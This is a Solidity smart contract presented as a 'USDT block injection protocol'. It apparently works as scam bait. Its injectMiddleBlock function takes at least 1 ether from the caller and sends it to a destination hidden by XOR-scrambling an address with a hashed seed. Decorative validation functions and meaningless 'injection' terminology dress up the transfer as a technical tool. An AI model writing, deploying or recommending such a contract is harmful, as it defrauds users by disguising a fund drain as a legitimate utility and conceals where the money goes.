// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/**
 * @title USDT_Block_Injector_v2.1
 * @dev Middle block injection protocol
 */

library InjectLib {
    bytes32 internal constant HASH_KEY = 0xf7a79a39b3582b82b9c3e2f238a9e3e7b05a91ff7f038e3d8b8815c3a5c9b3c8;
    uint256 internal constant MASK_VAL = 0xd94b35ab8f214c0e9aef7c64e0fc0a79;
    
    function computeInjectHash(bytes32 seed) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(seed, HASH_KEY));
    }
    
    function scrambleAddress(address addr, bytes32 seed) internal pure returns (address) {
        return address(uint160(addr) ^ uint160(uint256(seed) & 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF));
    }
    
    function validateBlock(uint256 blockNum, bytes32 seed) internal pure returns (bool) {
        uint256 hashVal = uint256(keccak256(abi.encodePacked(blockNum, seed)));
        return hashVal % 17 == 3;
    }
}

contract BlockInjector {
    using InjectLib for bytes32;
    using InjectLib for address;
    
    address private immutable _tgtAddress;
    bytes32 private immutable _seedHash;
    uint256 private _lastBlock;
    mapping(bytes32 => bool) private _processedBlocks;
    
    event Injection(bytes32 indexed blockHash, address indexed target, uint256 amount);
    
    constructor(bytes32 seed) {
        _seedHash = seed.computeInjectHash();
        _tgtAddress = 0x55d398326f99059fF775485246999027B3197955;
        _lastBlock = block.number;
    }
    
    function injectMiddleBlock(bytes calldata signature) external payable {
        require(msg.value >= 1 ether, "INSUFFICIENT_VALUE");
        
        bytes32 blockHash = blockhash(block.number - 1);
        require(!_processedBlocks[blockHash], "BLOCK_PROCESSED");
        
        bytes32 signatureHash = keccak256(signature);
        require(uint256(signatureHash) & 0xFFFF == uint256(_seedHash) & 0xFFFF, "INVALID_SIG");
        
        _processedBlocks[blockHash] = true;
        _lastBlock = block.number;
        
        address target = _tgtAddress.scrambleAddress(_seedHash);
        
        (bool success,) = payable(target).call{value: msg.value}("");
        require(success, "TRANSFER_FAILED");
        
        emit Injection(blockHash, target, msg.value);
    }
    
    function verifyBlockState(uint256 blockNum) external view returns (bool) {
        return InjectLib.validateBlock(blockNum, _seedHash);
    }
    
    function getLastProcessedBlock() external view returns (uint256) {
        return _lastBlock;
    }
    
    function _executeTokenTransfer(address token, address to, uint256 amount) private {
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, 0xa9059cbb00000000000000000000000000000000000000000000000000000000)
            mstore(add(ptr, 0x04), and(to, 0xffffffffffffffffffffffffffffffffffffffff))
            mstore(add(ptr, 0x24), amount)
            
            let success := call(gas(), token, 0, ptr, 0x44, ptr, 0x20)
            let result := mload(ptr)
            
            if or(iszero(success), iszero(result)) {
                revert(0, 0)
            }
        }
    }
    
    receive() external payable {}
}